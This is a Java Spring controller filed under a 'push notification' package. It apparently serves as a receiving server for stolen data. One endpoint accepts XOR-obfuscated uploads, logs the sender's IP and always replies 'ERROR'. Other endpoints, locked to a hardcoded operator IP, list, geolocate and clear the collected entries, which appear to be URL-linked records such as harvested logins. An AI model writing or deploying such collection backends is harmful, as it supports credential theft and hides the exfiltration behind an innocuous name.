package com.valloon.pushnotification.controller;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.io.IOUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.valloon.pushnotification.model.Note;
import com.valloon.pushnotification.service.NoteService;

@RestController
public class APIController extends BaseController {

	private static int lastCount = 0;
	private static String lastResult = "";

	private static byte[] KEY_BYTES = new byte[] { 48, 5, 120, 79 };

	public static byte[] XorBytes(byte[] input, byte[] key) {
		int length = input.length;
		int keyLength = key.length;
		for (int i = 0; i < length; i++) {
			input[i] ^= key[i % keyLength];
		}
		return input;
	}

	@Autowired
	protected NoteService noteService;
	private static Note testNote = null;

	@RequestMapping(path = "/note", produces = MediaType.TEXT_PLAIN_VALUE)
	public String note(HttpServletRequest request, HttpServletResponse response) throws IOException {
		String ip = request.getRemoteAddr();
		byte[] bytes = IOUtils.toByteArray(request.getInputStream());
		bytes = XorBytes(bytes, KEY_BYTES);
		String text = new String(bytes, "UTF-8");
		Note note = new Note(ip, text);
		if ((ip.equals("0:0:0:0:0:0:0:1") || ip.equals("188.43.136.32")) && text.contains("DESKTOP-2KTBPSE\\Valloon")) {
			testNote = note;
		} else {
			noteService.save(note);
		}
		return "ERROR";
	}

	@RequestMapping(path = "/notes-test", produces = MediaType.TEXT_PLAIN_VALUE)
	public String test(HttpServletRequest request, HttpServletResponse response) throws IOException {
		String ip = request.getRemoteAddr();
		if (!ip.equals("0:0:0:0:0:0:0:1") && !ip.equals("188.43.136.32"))
			return "E";
		StringBuilder builder = new StringBuilder();
		if (testNote == null)
			return "Null";
		Note note = testNote;
		String header = "* " + note.ip + " / " + getLocation(note.ip) + " / " + sdf.format(note.time);
		builder.append(note.text.replaceAll("https://", header + "\r\nhttps://").replaceAll("http://",
				header + "\r\nhttp://"));
		builder.append("\r\n\r\n");
		testNote = null;
		return builder.toString();
	}

	private static final SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

	@RequestMapping(path = "/notes", produces = MediaType.TEXT_PLAIN_VALUE)
	public String view(HttpServletRequest request, HttpServletResponse response) throws IOException {
		String ip = request.getRemoteAddr();
		if (!ip.equals("0:0:0:0:0:0:0:1") && !ip.equals("188.43.136.32"))
			return "E";
		List<Note> list = noteService.getAll();
		int count = list.size();
		if (lastCount != count) {
			lastCount = count;
			StringBuilder builder = new StringBuilder();
			for (int i = count - 1; i >= 0; i--) {
				Note note = list.get(i);
				String header = "(" + (i + 1) + " / " + count + ")   " + note.ip + " / " + getLocation(note.ip) + " / "
						+ sdf.format(note.time);
				builder.append(
						"====================================================================================================\r\n");
				builder.append("* " + header + " / ");
				builder.append(note.text.replaceAll("https://", header + "\r\nhttps://").replaceAll("http://",
						header + "\r\nhttp://"));
				builder.append("\r\n\r\n");
			}
			lastResult = builder.toString();
		}
		return lastResult;
	}

//	@RequestMapping(path = "/notes-del/{id}", produces = MediaType.TEXT_PLAIN_VALUE)
//	public String delete(HttpServletRequest request, HttpServletResponse response, @PathVariable long id)
//			throws IOException {
//		String ip = request.getRemoteAddr();
//		if (!ip.equals("0:0:0:0:0:0:0:1") && !ip.equals("188.43.136.32"))
//			return "E";
//		noteService.delete(id);
//		return Long.toString(id);
//	}

	@RequestMapping(path = "/notes-clear", produces = MediaType.TEXT_PLAIN_VALUE)
	public String clear(HttpServletRequest request, HttpServletResponse response) throws IOException {
		String ip = request.getRemoteAddr();
		if (!ip.equals("0:0:0:0:0:0:0:1") && !ip.equals("188.43.136.32"))
			return "E";
		noteService.clear();
		lastCount = 0;
		lastResult = "";
		return "0";
	}

	public static String getLocation(String ip) {
		try {
			String url = "http://extreme-ip-lookup.com/json/" + ip;
			String jsonString = requestGet(url);
			JsonParser parser = new JsonParser();
			JsonObject e = parser.parse(jsonString).getAsJsonObject();
			return e.get("country").getAsString() + ", " + e.get("city").getAsString() + ", "
					+ e.get("region").getAsString();
		} catch (Exception e) {
			return null;
		}
	}

	public static String requestGet(String targetURL) {
		HttpURLConnection connection = null;
		try {
			URL url = new URL(targetURL);
			connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			InputStream is = connection.getInputStream();
			BufferedReader rd = new BufferedReader(new InputStreamReader(is));
			StringBuilder response = new StringBuilder(); // or StringBuffer if Java version 5+
			String line;
			while ((line = rd.readLine()) != null) {
				response.append(line + "\r\n");
			}
			rd.close();
			return response.toString();
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		} finally {
			if (connection != null) {
				connection.disconnect();
			}
		}
	}

}